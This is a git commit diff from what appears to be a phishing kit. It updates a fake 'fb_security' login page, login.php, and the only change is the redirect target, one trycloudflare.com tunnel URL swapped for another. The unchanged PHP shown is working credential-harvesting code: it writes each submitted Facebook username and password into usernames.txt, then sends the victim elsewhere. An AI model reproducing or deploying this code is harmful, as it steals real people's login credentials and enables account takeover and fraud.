e1a8e3ed2bf5292949c4af823c4288beeb712c55
Mahfuz <11mahfuzrahman148@gmail.com>
2022-04-16 22:22:49 +0600

    nwlnk

--- .sites/fb_security/login.php
+++ .sites/fb_security/login.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Facebook Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://anticipated-theater-pill-soil.trycloudflare.com');
+header('Location: https://criminal-kodak-assets-amd.trycloudflare.com');
 exit();
 ?>
